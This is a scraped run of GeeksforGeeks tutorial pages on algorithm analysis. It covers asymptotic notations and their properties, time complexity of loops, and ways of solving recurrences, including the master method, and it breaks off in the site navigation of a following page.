ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeDifference between NP hard and NP complete problemUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity Analysis Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 3 (Asymptotic Notations) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithms | Set 3 (Asymptotic Notations) Last Updated: 19-12-2020 We have discussed Asymptotic Analysis, and Worst, Average, and Best Cases of Algorithms. The main idea of asymptotic analysis is to have a measure of the efficiency of algorithms that don’t depend on machine-specific constants and doesn’t require algorithms to be implemented and time taken by programs to be compared. Asymptotic notations are mathematical tools to represent the time complexity of algorithms for asymptotic analysis. The following 3 asymptotic notations are mostly used to represent the time complexity of algorithms. 1) Θ Notation: The theta notation bounds a function from above and below, so it defines exact asymptotic behavior. A simple way to get Theta notation of an expression is to drop low order terms and ignore leading constants. For example, consider the following expression. 3n3 + 6n2 + 6000 = Θ(n3) Dropping lower order terms is always fine because there will always be a n0 after which Θ(n3) has higher values than Θn2) irrespective of the constants involved. For a given function g(n), we denote Θ(g(n)) is following set of functions. Θ(g(n)) = {f(n): there exist positive constants c1, c2 and n0 such that 0 <= c1*g(n) <= f(n) <= c2*g(n) for all n >= n0} The above definition means, if f(n) is theta of g(n), then the value f(n) is always between c1*g(n) and c2*g(n) for large values of n (n >= n0). The definition of theta also requires that f(n) must be non-negative for values of n greater than n0. 2) Big O Notation: The Big O notation defines an upper bound of an algorithm, it bounds a function only from above. For example, consider the case of Insertion Sort. It takes linear time in best case and quadratic time in worst case. We can safely say that the time complexity of Insertion sort is O(n^2). Note that O(n^2) also covers linear time. If we use Θ notation to represent time complexity of Insertion sort, we have to use two statements for best and worst cases: 1. The worst case time complexity of Insertion Sort is Θ(n^2). 2. The best case time complexity of Insertion Sort is Θ(n). The Big O notation is useful when we only have upper bound on time complexity of an algorithm. Many times we easily find an upper bound by simply looking at the algorithm. O(g(n)) = { f(n): there exist positive constants c and n0 such that 0 <= f(n) <= c*g(n) for all n >= n0} 3) Ω Notation: Just as Big O notation provides an asymptotic upper bound on a function, Ω notation provides an asymptotic lower bound. Ω Notation can be useful when we have lower bound on time complexity of an algorithm. As discussed in the previous post, the best case performance of an algorithm is generally not useful, the Omega notation is the least used notation among all three. For a given function g(n), we denote by Ω(g(n)) the set of functions. Ω (g(n)) = {f(n): there exist positive constants c and n0 such that 0 <= c*g(n) <= f(n) for all n >= n0}. Let us consider the same Insertion sort example here. The time complexity of Insertion Sort can be written as Ω(n), but it is not a very useful information about insertion sort, as we are generally interested in worst case and sometimes in average case. Properties of Asymptotic Notations : As we have gone through the definition of this three notations let’s now discuss some important properties of those notations. 1. General Properties : If f(n) is O(g(n)) then a*f(n) is also O(g(n)) ; where a is a constant. Example: f(n) = 2n²+5 is O(n²) then 7*f(n) = 7(2n²+5) = 14n²+35 is also O(n²) . Similarly this property satisfies for both Θ and Ω notation. We can say If f(n) is Θ(g(n)) then a*f(n) is also Θ(g(n)) ; where a is a constant. If f(n) is Ω (g(n)) then a*f(n) is also Ω (g(n)) ; where a is a constant. 2. Transitive Properties : If f(n) is O(g(n)) and g(n) is O(h(n)) then f(n) = O(h(n)) . Example: if f(n) = n, g(n) = n² and h(n)=n³ n is O(n²) and n² is O(n³) then n is O(n³) Similarly this property satisfies for both Θ and Ω notation. We can say If f(n) is Θ(g(n)) and g(n) is Θ(h(n)) then f(n) = Θ(h(n)) . If f(n) is Ω (g(n)) and g(n) is Ω (h(n)) then f(n) = Ω (h(n)) 3. Reflexive Properties : Reflexive properties are always easy to understand after transitive. If f(n) is given then f(n) is O(f(n)). Since MAXIMUM VALUE OF f(n) will be f(n) ITSELF ! Hence x = f(n) and y = O(f(n) tie themselves in reflexive relation always. Example: f(n) = n² ; O(n²) i.e O(f(n)) Similarly this property satisfies for both Θ and Ω notation. We can say that: If f(n) is given then f(n) is Θ(f(n)). If f(n) is given then f(n) is Ω (f(n)). 4. Symmetric Properties : If f(n) is Θ(g(n)) then g(n) is Θ(f(n)) . Example: f(n) = n² and g(n) = n² then f(n) = Θ(n²) and g(n) = Θ(n²) This property only satisfies for Θ notation. 5. Transpose Symmetric Properties : If f(n) is O(g(n)) then g(n) is Ω (f(n)). Example: f(n) = n , g(n) = n² then n is O(n²) and n² is Ω (n) This property only satisfies for O and Ω notations. 6. Some More Properties : 1.) If f(n) = O(g(n)) and f(n) = Ω(g(n)) then f(n) = Θ(g(n)) 2.) If f(n) = O(g(n)) and d(n)=O(e(n)) then f(n) + d(n) = O( max( g(n), e(n) )) Example: f(n) = n i.e O(n) d(n) = n² i.e O(n²) then f(n) + d(n) = n + n² i.e O(n²) 3.) If f(n)=O(g(n)) and d(n)=O(e(n)) then f(n) * d(n) = O( g(n) * e(n) ) Example: f(n) = n i.e O(n) d(n) = n² i.e O(n²) then f(n) * d(n) = n * n² = n³ i.e O(n³) _______________________________________________________________________________ Exercise: Which of the following statements is/are valid? 1. Time Complexity of QuickSort is Θ(n^2) 2. Time Complexity of QuickSort is O(n^2) 3. For any two functions f(n) and g(n), we have f(n) = Θ(g(n)) if and only if f(n) = O(g(n)) and f(n) = Ω(g(n)). 4. Time complexity of all computer algorithms can be written as Ω(1) Important Links : There are two more notations called little o and little omega. Little o provides strict upper bound (equality condition is removed from Big O) and little omega provides strict lower bound (equality condition removed from big omega) Analysis of Algorithms | Set 4 (Analysis of Loops) Recent Articles on analysis of algorithm. References:Lec 1 | MIT (Introduction to Algorithms) This article is contributed by Abhay Rathi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 1 (Asymptotic Analysis)Properties of Asymptotic NotationsAsymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1Improved By : OmkarJai, AmiyaRanjanRout, kaustubh765 Article Tags : AnalysisArticles thumb_up 145 To-do Done 1.7 Based on 273 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page NP-Completeness | Set 1 (Introduction) Next last_page Analysis of Algorithms | Set 4 (Analysis of Loops) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 4 (Analysis of Loops) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithms | Set 4 (Analysis of Loops) Last Updated: 08-05-2019 We have discussed Asymptotic Analysis, Worst, Average and Best Cases and Asymptotic Notations in previous posts. In this post, analysis of iterative programs with simple examples is discussed. 1) O(1): Time complexity of a function (or set of statements) is considered as O(1) if it doesn’t contain loop, recursion and call to any other non-constant time function. // set of non-recursive and non-loop statements For example swap() function has O(1) time complexity. A loop or recursion that runs a constant number of times is also considered as O(1). For example the following loop is O(1). // Here c is a constant for (int i = 1; i <= c; i++) { // some O(1) expressions } 2) O(n): Time Complexity of a loop is considered as O(n) if the loop variables is incremented / decremented by a constant amount. For example following functions have O(n) time complexity. // Here c is a positive integer constant for (int i = 1; i <= n; i += c) { // some O(1) expressions } for (int i = n; i > 0; i -= c) { // some O(1) expressions } 3) O(nc): Time complexity of nested loops is equal to the number of times the innermost statement is executed. For example the following sample loops have O(n2) time complexity for (int i = 1; i <=n; i += c) { for (int j = 1; j <=n; j += c) { // some O(1) expressions } } for (int i = n; i > 0; i -= c) { for (int j = i+1; j <=n; j += c) { // some O(1) expressions } For example Selection sort and Insertion Sort have O(n2) time complexity. 4) O(Logn) Time Complexity of a loop is considered as O(Logn) if the loop variables is divided / multiplied by a constant amount. for (int i = 1; i <=n; i *= c) { // some O(1) expressions } for (int i = n; i > 0; i /= c) { // some O(1) expressions } For example Binary Search(refer iterative implementation) has O(Logn) time complexity. Let us see mathematically how it is O(Log n). The series that we get in first loop is 1, c, c2, c3, … ck. If we put k equals to Logcn, we get cLogcn which is n. 5) O(LogLogn) Time Complexity of a loop is considered as O(LogLogn) if the loop variables is reduced / increased exponentially by a constant amount. // Here c is a constant greater than 1 for (int i = 2; i <=n; i = pow(i, c)) { // some O(1) expressions } //Here fun is sqrt or cuberoot or any other constant root for (int i = n; i > 1; i = fun(i)) { // some O(1) expressions } See this for mathematical details. How to combine time complexities of consecutive loops? When there are consecutive loops, we calculate time complexity as sum of time complexities of individual loops. for (int i = 1; i <=m; i += c) { // some O(1) expressions } for (int i = 1; i <=n; i += c) { // some O(1) expressions } Time complexity of above code is O(m) + O(n) which is O(m+n) If m == n, the time complexity becomes O(2n) which is O(n). How to calculate time complexity when there are many if, else statements inside loops? As discussed here, worst case time complexity is the most useful among best, average and worst. Therefore we need to consider worst case. We evaluate the situation when values in if-else conditions cause maximum number of statements to be executed. For example consider the linear search function where we consider the case when element is present at the end or not present at all. When the code is too complex to consider all if-else cases, we can get an upper bound by ignoring if else and other complex control statements. How to calculate time complexity of recursive functions? Time complexity of a recursive function can be written as a mathematical recurrence relation. To calculate time complexity, we must know how to solve recurrences. We will soon be discussing recurrence solving techniques as a separate post. Quiz on Analysis of Algorithms Next – Analysis of Algorithm | Set 4 (Solving Recurrences) Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Performance of loops (A caching question)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1 Article Tags : AnalysisArticles thumb_up 109 To-do Done 1.5 Based on 216 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 3 (Asymptotic Notations) Next last_page Analysis of Algorithm | Set 4 (Solving Recurrences) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithm | Set 4 (Solving Recurrences) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Understanding Time Complexity with Simple ExamplesComplexity of different operations in Binary tree, Binary Search Tree and AVL tree Analysis of Algorithm | Set 4 (Solving Recurrences) Last Updated: 22-04-2020 In the previous post, we discussed analysis of loops. Many algorithms are recursive in nature. When we analyze them, we get a recurrence relation for time complexity. We get running time on an input of size n as a function of n and the running time on inputs of smaller sizes. For example in Merge Sort, to sort a given array, we divide it in two halves and recursively repeat the process for the two halves. Finally we merge the results. Time complexity of Merge Sort can be written as T(n) = 2T(n/2) + cn. There are many other algorithms like Binary Search, Tower of Hanoi, etc. There are mainly three ways for solving recurrences. 1) Substitution Method: We make a guess for the solution and then we use mathematical induction to prove the guess is correct or incorrect. For example consider the recurrence T(n) = 2T(n/2) + n We guess the solution as T(n) = O(nLogn). Now we use induction to prove our guess. We need to prove that T(n) <= cnLogn. We can assume that it is true for values smaller than n. T(n) = 2T(n/2) + n <= 2cn/2Log(n/2) + n = cnLogn - cnLog2 + n = cnLogn - cn + n <= cnLogn 2) Recurrence Tree Method: In this method, we draw a recurrence tree and calculate the time taken by every level of tree. Finally, we sum the work done at all levels. To draw the recurrence tree, we start from the given recurrence and keep drawing till we find a pattern among levels. The pattern is typically a arithmetic or geometric series. For example consider the recurrence relation T(n) = T(n/4) + T(n/2) + cn2 cn2 / \ T(n/4) T(n/2) If we further break down the expression T(n/4) and T(n/2), we get following recursion tree. cn2 / \ c(n2)/16 c(n2)/4 / \ / \ T(n/16) T(n/8) T(n/8) T(n/4) Breaking down further gives us following cn2 / \ c(n2)/16 c(n2)/4 / \ / \ c(n2)/256 c(n2)/64 c(n2)/64 c(n2)/16 / \ / \ / \ / \ To know the value of T(n), we need to calculate sum of tree nodes level by level. If we sum the above tree level by level, we get the following series T(n) = c(n^2 + 5(n^2)/16 + 25(n^2)/256) + .... The above series is geometrical progression with ratio 5/16. To get an upper bound, we can sum the infinite series. We get the sum as (n2)/(1 - 5/16) which is O(n2) 3) Master Method: Master Method is a direct way to get the solution. The master method works only for following type of recurrences or for recurrences that can be transformed to following type. T(n) = aT(n/b) + f(n) where a >= 1 and b > 1 There are following three cases: 1. If f(n) = Θ(nc) where c < Logba then T(n) = Θ(nLogba) 2. If f(n) = Θ(nc) where c = Logba then T(n) = Θ(ncLog n) 3.If f(n) = Θ(nc) where c > Logba then T(n) = Θ(f(n)) How does this work? Master method is mainly derived from recurrence tree method. If we draw recurrence tree of T(n) = aT(n/b) + f(n), we can see that the work done at root is f(n) and work done at all leaves is Θ(nc) where c is Logba. And the height of recurrence tree is Logbn In recurrence tree method, we calculate total work done. If the work done at leaves is polynomially more, then leaves are the dominant part, and our result becomes the work done at leaves (Case 1). If work done at leaves and root is asymptotically same, then our result becomes height multiplied by work done at any level (Case 2). If work done at root is asymptotically more, then our result becomes work done at root (Case 3). Examples of some standard algorithms whose time complexity can be evaluated using Master Method Merge Sort: T(n) = 2T(n/2) + Θ(n). It falls in case 2 as c is 1 and Logba] is also 1. So the solution is Θ(n Logn) Binary Search: T(n) = T(n/2) + Θ(1). It also falls in case 2 as c is 0 and Logba is also 0. So the solution is Θ(Logn) Notes: 1) It is not necessary that a recurrence of the form T(n) = aT(n/b) + f(n) can be solved using Master Theorem. The given three cases have some gaps between them. For example, the recurrence T(n) = 2T(n/2) + n/Logn cannot be solved using master method. 2) Case 2 can be extended for f(n) = Θ(ncLogkn) If f(n) = Θ(ncLogkn) for some constant k >= 0 and c = Logba, then T(n) = Θ(ncLogk+1n) Practice Problems and Solutions on Master Theorem. Next – Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) References: http://en.wikipedia.org/wiki/Master_theorem MIT Video Lecture on Asymptotic Notation | Recurrences | Substitution, Master Method Introduction to Algorithms 3rd Edition by Clifford Stein, Thomas H. Cormen, Charles E. Leiserson, Ronald L. Rivest Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Algorithms | Recurrences | Set 1Algorithms Sample Questions | Recurrences | Set 2Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Master Theorem For Subtract and Conquer RecurrencesAdvanced master theorem for divide and conquer recurrencesAnalysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisImproved By : Manish Dhanuka, animagussirius7 Article Tags : Analysis thumb_up 55 To-do Done 2.8 Based on 196 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 4 (Analysis of Loops) Next last_page Tail Recursion Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary SearchCyclomatic Complexity More related articles in Analysis Analysis of Algorithms | Set 5 (Practice Problems)Analysis of different sorting techniquesProof that SAT is NP CompleteTime complexity of recursive Fibonacci programAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the 